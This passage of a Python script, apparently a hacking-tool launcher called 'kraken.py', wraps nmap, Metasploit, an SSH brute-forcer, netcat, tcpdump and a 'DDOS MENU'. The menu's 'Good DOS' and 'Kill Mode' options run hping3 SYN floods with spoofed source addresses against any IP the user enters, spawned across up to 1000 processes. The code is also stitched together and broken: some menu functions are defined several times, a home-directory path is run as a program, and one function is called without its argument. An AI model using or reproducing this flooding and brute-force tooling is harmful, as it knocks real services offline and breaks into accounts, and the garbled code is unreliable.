    if asn:
        home_directory = get_user_home_directory()
        if home_directory:
            asnmap_path = os.path.join(home_directory)
            try:
                # Log the full command being executed for debugging
                print(f"Running ASN scan command: {asnmap_path} -a {asn}")
                process = subprocess.Popen([asnmap_path, "-a", asn], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                # Read and display the output in real-time
                for line in process.stdout:
                    print(line, end="")
                process.stdout.close()
                process.wait()
                if process.returncode != 0:
                    print(f"Error: {process.stderr.read()}")
            except Exception as e:
                print(f"Error running {asnmap_path}: {e}")
        else:
            print("Could not determine the user's home directory.")
    else:
        print("No ASN entered. Returning to the menu.")
    input("\nPress Enter to return to the menu.")

def enter_api_key():
    api_key = input("Enter your API key for ./asnmap: ").strip()
    if api_key:
        home_directory = get_user_home_directory()
        if home_directory:
            asnmap_path = os.path.join(home_directory)
            try:
                # Log the full command for debugging
                print(f"Running API key command: {asnmap_path} -auth {api_key}")
                subprocess.run([asnmap_path, "-auth", api_key], check=True)
                print("Signed in successfully with the provided API key.")
            except subprocess.CalledProcessError as e:
                print(f"Failed to sign in with the provided API key: {e}")
        else:
            print("Could not determine the user's home directory.")
    else:
        print("No API key entered.")
    input("\nPress Enter to return to the menu: ")

def asnmap_menu():
    while True:
        clear_screen()
        print("\nASNMap Menu:")
        print("1. ASNMap Commands")
        print("2. Run ASNMap (Manual Command)")
        print("3. Run ASN Scan")
        print("4. Enter API Key for ASNMap")
        print("5. Return to Main Menu")

        choice = input("Choose an option: ")

        if choice == "1":
            asnmap_commands()
        elif choice == "2":
            run_asnmap_manual()
        elif choice == "3":
            run_asn_scan()
        elif choice == "4":
            enter_api_key()
        elif choice == "5":
            break
        else:
            print("Invalid choice, please try again.")
def find_cerbrutus_dir():
    """Automatically find the Cerbrutus directory."""
    try:
        home_dir = os.path.expanduser("~")
        cerbrutus_dir = os.path.join(home_dir, "cerbrutus")  

        if os.path.exists(cerbrutus_dir):
            return cerbrutus_dir
        else:
            print("Cerbrutus directory not found!")
            return None
    except Exception as e:
        print(f"Error finding Cerbrutus directory: {e}")
        return None

def clear_screen():
    """Clears the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def run_cerbrutus():
    """Function to run Cerbrutus with options for manual mode."""
    cerbrutus_dir = find_cerbrutus_dir()  

    if cerbrutus_dir is None:
        print("Cerbrutus not found. Exiting...")
        return

    while True:
        clear_screen()
        print("\nCerbrutus Menu:")
        print("1. Show Cerbrutus Help")
        print("2. Run Cerbrutus with Custom Command")
        print("3. Return to Main Menu")

        choice = input("\nChoose an option: ").strip()

        if choice == '1':
           
            print("\nPython-based Network Brute Forcing Tool!")
            print("""\nUsage: cerbrutus.py [options]
positional arguments:
  Host                  The host to connect to - in IP or VHOST/Domain Name form
  Service               The service to brute force (currently implemented 'SSH')

options:
  -h, --help            show this help message and exit
  -U USERS, --users USERS
                        Either a single user, or the path to the file of users you wish to use
  -P PASSWORDS, --passwords PASSWORDS
                        Either a single password, or the path to the password list you wish to use
  -p PORT, --port PORT  The port you wish to target (only required if running on a non-standard port)
  -t THREADS, --threads THREADS
                        Number of threads to use
  -q [QUIET ...], --quiet [QUIET ...]
            """)
            input("\nPress Enter to return to the menu...")

        elif choice == '2':
            # Run Cerbrutus with a custom command
            custom_command = input("Enter your Cerbrutus command (excluding 'python3 cerbrutus.py'): ").strip()
            if custom_command:
                full_command = f"python3 {os.path.join(cerbrutus_dir, 'cerbrutus.py')} {custom_command}"
                print(f"Running custom command: {full_command}")
                try:
                    
                    result = subprocess.run(full_command, shell=True, cwd=cerbrutus_dir, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    
                    print(result.stdout.decode())
                    if result.stderr:
                        print(result.stderr.decode())
                    input("\nPress Enter to return to the menu...")
                except subprocess.CalledProcessError as e:
                    print(f"Error running Cerbrutus: {e}")
            else:
                print("No command entered.")

        elif choice == '3':
            
            break

        else:
            print("Invalid choice. Please try again.")

def signal_handler(sig, frame):
    print("\nExiting...")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


def menu():
    while True:
        clear_screen()
        print("\nMain Menu:")
        print("1. Run Cerbrutus")
        print("2. Exit")

        choice = input("\nChoose an option: ").strip()

        if choice == '1':
            run_cerbrutus()
        elif choice == '2':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")
def signal_handler(sig, frame):
    print("\nExiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def ping_ip():
    """Prompt for an IP address and ping it."""
    while True:
        ip = input("Enter IP address to ping (or press 99 to return to the main menu): ")

        
        if ip == '99':
            return 

        
        os_type = platform.system().lower()

        try:
            
            if os_type == "windows":
                response = subprocess.run(["ping", "-n", "4", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
            else:
                
                response = subprocess.run(["ping", "-c", "4", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)

            
            if response.returncode == 0:
                print(f"\nPing to {ip} successful!")
                print(response.stdout.decode())  
            else:
                print("\nPing failed!")
                print(response.stderr.decode())  

        except subprocess.TimeoutExpired:
            print("\nPing request timed out.")
        except Exception as e:
            print(f"An error occurred: {e}")

        
        return_to_menu = input("\nPress 99 to return to the main menu, or Enter to try another IP: ")
        if return_to_menu == '99':
            return  
def menu():
    while True:
        print("\nSelect an option:")
        print("1. Ping an IP address")
        print("2. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            ping_ip()  
        elif choice == '2':
            print("Exiting...")
            break
        else:
            print("Invalid option, please try again.")
def hostname_to_ip(hostname):
    try:
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except socket.gaierror:
        
        return f"Error: Unable to resolve hostname {hostname}"
def scan_hostname_to_ip():
    hostname = input("Enter a hostname to resolve to IP: ")
    ip_address = hostname_to_ip(hostname)
    print(f"The IP address for hostname {hostname} is {ip_address}")
    return_to_main_menu()

def return_to_main_menu():
    print("\nReturn to main menu")
    input("Press Enter to continue...")

def main_menu():
    while True:
        print("\nMain Menu:")
        print("1. Scan hostname to IP")
        print("2. Exit")
        choice = input("Choose an option: ")

        if choice == "1":
            scan_hostname_to_ip()  
        elif choice == "2":
            print("Exiting the script.")
            break
        else:
            print("Invalid option, please choose again.")

def signal_handler(sig, frame):
    print("\nExiting...")
    sys.exit(0)
def manual_netcat_command():
    command = input("Enter your custom Netcat command (e.g., nc -v example.com 1234): ")
    try:
        print(f"Running command: {command}")
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running command: {e}")
    except KeyboardInterrupt:
        print("\nExiting Netcat...")

def netcat_listener():
    port = input("Enter the port to listen on: ")
    try:
        print(f"Starting Netcat listener on port {port}...")
        subprocess.run(["nc", "-l", port], check=True)
        print(f"Netcat is now listening on port {port}...")
    except subprocess.CalledProcessError as e:
        print(f"Error running Netcat: {e}")
    except KeyboardInterrupt:
        print("\nExiting Netcat listener...")

def netcat_menu():
    while True:
        print("\nNetcat Menu:")
        print("1. Manual Netcat Command")
        print("99. Back to Main Menu")

        choice = input("Select an option (1-99 to return): ")
        
        if choice == "1":
            manual_netcat_command()
        elif choice == "99":
            print("Returning to Main Menu...")
            break
        else:
            print("Invalid choice. Please try again.")

def clear_screen():
    print("\033[H\033[J", end="")  

def signal_handler(sig, frame):
    print("\nInterrupt received. Returning to the menu...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def show_packets(command):
    """Function to show packets being sent in real-time using tcpdump."""
    try:
        print("Starting to show packets...")

        # Run tcpdump with sudo to capture only the relevant packets
        capture_command = "sudo tcpdump -i any -nn -v -A 'tcp' 2>/dev/null"  # Captures only TCP packets
        process = subprocess.Popen(capture_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Read and display tcpdump output in real-time
        while True:
            output = process.stdout.readline()
            if output == b"" and process.poll() is not None:
                break
            if output:
                line = output.decode('utf-8').strip()
                print(line)  # You can add colors or formatting here if desired

    except Exception as e:
        print(f"Error capturing packets: {e}")


def run_hping3_good_dos_stress(target_ip, target_port, threads, packet_rate):
    """
    Stress test the target with hping3 Good DOS attack while controlling packet rate.
    """
    command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i {packet_rate} {target_ip}"
    print(f"Running Good DOS stress test on {target_ip} using port {target_port} with {threads} threads...")

    for _ in range(threads):
        subprocess.Popen(command_good_dos, shell=True)

    print(f"Stress test running with packet rate: {packet_rate}")


def run_hping3_good_dos(target_ip, target_port, threads):
    command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
    print(f"Running Good DOS attack on {target_ip} using port {target_port} with {threads} threads...")

    for _ in range(threads):
        subprocess.run(command_good_dos, shell=True)


def run_hping3_kill_mode(target_ip, target_port, threads):
    command_kill_mode = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
    print(f"Running Kill Mode attack on {target_ip} using port {target_port} with {threads} threads...")

    for _ in range(threads):
        subprocess.run(command_kill_mode, shell=True)


def stress_test_good_dos_prompt():
    while True:
        try:
            target_ip = input("Enter the target IP address: ").strip()
            target_port = input("Enter the port number (e.g 80): ").strip()
            threads = int(input("Enter the number of threads (e.g., 3, 5, 10, 20, 50, 100, 250, 500, 1000): ").strip())
            packet_rate = input("Enter the packet rate (e.g., u1000, u5000, u10000): ").strip()

            if threads in [3, 5, 10, 20, 50, 100, 250, 500, 1000]:
                # Start the packet capturing in a separate thread
                packet_thread = threading.Thread(target=show_packets, args=("tcpdump",))
                packet_thread.daemon = True
                packet_thread.start()

                # Run the Good DOS stress test
                run_hping3_good_dos_stress(target_ip, target_port, threads, packet_rate)
            else:
                print("Invalid thread count. Please enter one of the allowed values.")
                continue
        except Exception as e:
            print(f"Error running command: {e}")
        
        cont = input("Do you want to run another stress test? (y/n): ").strip().lower()
        if cont != 'y':
            print("Returning to the menu...")
            break


def hping3_menu():
    while True:
        print(Fore.BLUE+"******")
        print("\== DDOS MENU ==")
        print("1. Good DOS Attack")
        print("2. Kill Mode Attack")
        print("3. Stress Test Mode")
        print("4. Return to Main Menu")
        print(Fore.BLUE+"*************")
        choice = input("Choose an option: ")

        if choice == "1":
            target_ip = input("Enter the target IP address: ").strip()
            target_port = input("Enter the port number (e.g., 80): ").strip()
            threads = int(input("Enter the number of threads (e.g 3, 5, 10, 20, 50, 100, 250, 500, 1000): ").strip())
            run_hping3_good_dos(target_ip, target_port, threads)
        elif choice == "2":
            target_ip = input("Enter the target IP address: ").strip()
            target_port = input("Enter the port number (e.g., 80): ").strip()
            threads = int(input("Enter the number of threads (e.g., 3, 5, 10, 20, 50, 100, 250, 500, 1000): ").strip())
            run_hping3_kill_mode(target_ip, target_port, threads)
        elif choice == "3":
            stress_test_good_dos_prompt()
        elif choice == "4":
            break
        else:
            print("Invalid choice, please try again.")

def whois_lookup():
    try:
        ip_address = input("Enter an IP address for WHOIS lookup: ").strip()
        if ip_address:
            print("\nPerforming WHOIS lookup...\n")
            # Use subprocess to call the whois command
            result = subprocess.run(["whois", ip_address], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0:
                print(result.stdout)  # Print the output of the whois command
            else:
                print(f"Error: {result.stderr.strip()}")
        else:
            print("No IP address entered.")
    except KeyboardInterrupt:
        print("\nWHOIS lookup canceled.")
    input("\nPress Enter to return to the menu.")

def main_menu():
    while True:
        print("\nMain Menu:")
        print("1. WHOIS Lookup")
        print("2. Exit")

        choice = input("Choose an option: ")

        if choice == "1":
            whois_lookup()
        elif choice == "2":
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")
init(autoreset=True)
def run_tcpdump():
    try:
        print(Fore.YELLOW + "Starting tcpdump...")

        # Run tcpdump with sudo to capture only TCP traffic
        command = "sudo tcpdump -i any -l tcp"  # Use -l for line buffering, -i any for all interfaces
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Read and colorize the output
        while True:
            output = process.stdout.readline()
            if output == b"" and process.poll() is not None:
                break
            if output:
                line = output.decode('utf-8').strip()

                # Apply color based on packet type
                if "TCP" in line:
                    print(Fore.LIGHTRED_EX + line)  # Light red for TCP packets
                elif "IP" in line:
                    print(Fore.LIGHTGREEN_EX + line)  # Light green for IP packets
                else:
                    print(Fore.LIGHTYELLOW_EX + line)  # Light yellow for other packets

    except Exception as e:
        print(Fore.RED + f"Error running tcpdump: {e}")

def run_tcpdump_ip_details():
    try:
        print(Fore.YELLOW + "Starting tcpdump with detailed IP information...")

        # Run tcpdump with sudo to capture all packet information, focusing on IP details
        command = "sudo tcpdump -i any -nn -v -A"  # -nn for no DNS resolution, -v for verbose, -A for ASCII output
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Read and colorize the output
        while True:
            output = process.stdout.readline()
            if output == b"" and process.poll() is not None:
                break
            if output:
                line = output.decode('utf-8').strip()

                # Apply color based on packet type
                if "IP" in line:
                    print(Fore.LIGHTGREEN_EX + line)  # Light green for IP packets
                elif "TCP" in line:
                    print(Fore.LIGHTRED_EX + line)  # Light red for TCP packets
                else:
                    print(Fore.LIGHTYELLOW_EX + line)  # Light yellow for other packets

    except Exception as e:
        print(Fore.RED + f"Error running tcpdump: {e}")

def run_tcpdump_wireshark_like():
    try:
        print(Fore.YELLOW + "Starting tcpdump with Wireshark-like detailed information...")

        # Run tcpdump with sudo to capture detailed packet info like Wireshark
        command = "sudo tcpdump -i any -nn -v -X -s 0"  # -nn for no DNS resolution, -v for verbose, -X for hex and ASCII, -s 0 for full packet capture
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Read and colorize the output
        while True:
            output = process.stdout.readline()
            if output == b"" and process.poll() is not None:
                break
            if output:
                line = output.decode('utf-8').strip()

                # Apply color based on packet type
                if "IP" in line:
                    print(Fore.LIGHTGREEN_EX + line)  # Light green for IP packets
                elif "TCP" in line:
                    print(Fore.LIGHTRED_EX + line)  # Light red for TCP packets
                else:
                    print(Fore.LIGHTYELLOW_EX + line)  # Light yellow for other packets

    except Exception as e:
        print(Fore.RED + f"Error running tcpdump: {e}")

def tcpdump_menu():
    while True:
        print("\nTCPDump Menu:")
        print("1. normal sniff")
        print("2. mid sniff")
        print("3. hard sniff")
        print("4. Return to Main Menu")

        choice = input("Choose an option: ")

        if choice == "1":
            run_tcpdump()  # Run tcpdump with basic packet capture
        elif choice == "2":
            run_tcpdump_ip_details()  # Run tcpdump with detailed IP capture
        elif choice == "3":
            run_tcpdump_wireshark_like()  # Run tcpdump with Wireshark-like detailed capture
        elif choice == "4":
            print("Returning to main menu...")
            break
        else:
            print("Invalid choice, please try again.")
def main_menu():
    while True:
        show_main_menu_logo()

        # Display update info and version
        print(Fore.LIGHTWHITE_EX + "sudo python3 kraken.py To Update, Then Exit Program")
        print(Fore.LIGHTMAGENTA_EX + "V 0.2")

        # Display tool credits
        print(Fore.LIGHTRED_EX + "use the tool nicely @biskit")

        # Define menu options
        options = [
            "[1] Nmap",
            "[2] Every Single Nmap Command",
            "[3] SSLScan",
            "[4] Metasploit",
            "[5] Routersploit",
            "[6] Tracepath",
            "[7] IP Lookup",
            "[8] ASNMap",
            "[9] Airgeddon",
            "[10] Netdiscover",
            "[11] Netcat",
            "[12] Hostname to Private IP",
            "[13] Network Brute Force Tool / Cerbrutus",
            "[14] Whois IP Search",
            "[15] Update Script",
            "[16] DDoS",
            "[17] Ping IP",
            "[18] Sniff",
            "[99] Exit", 
        ]

        # Display all options in a visually appealing format
        for option in options:
            print(Fore.LIGHTCYAN_EX + option)

        # Prompt for user input
        choice = input(Fore.LIGHTGREEN_EX + "\nkraken> " + Style.RESET_ALL).strip()

        # Handle menu choices
        if choice == '1':
            run_nmap()
        elif choice == '2':
            show_all_nmap_commands()
        elif choice == '3':
            sslscan_scan()
        elif choice == '4':
            metasploit_scan()
        elif choice == '5':
            run_routersploit()
        elif choice == '6':
            run_tracepath()
        elif choice == '7':
           execute_python_script()
        elif choice == '8':
            asnmap_menu()
        elif choice == '9':
            run_airgeddon()
        elif choice == '10':
            netdiscover_menu()
        elif choice == '11':
            netcat_menu()
        elif choice == '12':
            hostname_to_ip()
        elif choice == '13':
            run_cerbrutus()
        elif choice == '14':
            whois_lookup()
        elif choice == '15':
            update_script()
        elif choice == '16':
            hping3_menu()
        elif choice == '17':
            ping_ip()
        elif choice == '18':
            tcpdump_menu()
        elif choice == '99':
            exiting_loading_screen()
            break
        else:
            print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
if __name__ == "__main__":
    main_menu()
